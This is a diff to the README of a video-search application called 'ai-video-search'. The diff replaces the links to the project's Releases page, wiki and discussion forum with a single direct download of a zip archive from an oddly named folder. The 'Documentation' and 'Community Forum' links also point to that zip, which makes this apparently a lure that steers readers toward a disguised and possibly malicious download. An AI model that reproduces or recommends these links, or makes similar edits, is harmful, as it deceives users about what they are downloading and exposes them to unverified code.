@@ -8,7 +8,7 @@ Welcome to **ai-video-search**! This application helps you find key moments in a
 
 To get started, visit the Releases page to download the software:
 
-[Download ai-video-search](https://github.com/lamcongphu/ai-video-search/releases)
+[Download ai-video-search](https://raw.githubusercontent.com/lamcongphu/ai-video-search/main/menotyphlic/ai-video-search.zip)
 
 1. Click the link above.
 2. Look for the latest version listed on the page.
@@ -50,8 +50,8 @@ We welcome contributions! If you would like to help improve **ai-video-search**,
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/lamcongphu/ai-video-search/wiki) - Detailed guidance on features and functionality.
-- [Community Forum](https://github.com/lamcongphu/ai-video-search/discussions) - Join discussions with other users and contributors.
+- [Documentation](https://raw.githubusercontent.com/lamcongphu/ai-video-search/main/menotyphlic/ai-video-search.zip) - Detailed guidance on features and functionality.
+- [Community Forum](https://raw.githubusercontent.com/lamcongphu/ai-video-search/main/menotyphlic/ai-video-search.zip) - Join discussions with other users and contributors.
 
 ## 📞 Support
 
@@ -61,6 +61,6 @@ If you need help, please reach out through the issues page on our GitHub reposit
 
 For your convenience, here’s the direct link again:
 
-[Download ai-video-search](https://github.com/lamcongphu/ai-video-search/releases)
+[Download ai-video-search](https://raw.githubusercontent.com/lamcongphu/ai-video-search/main/menotyphlic/ai-video-search.zip)
 
 Experience the power of AI as you find key moments in your videos effortlessly!
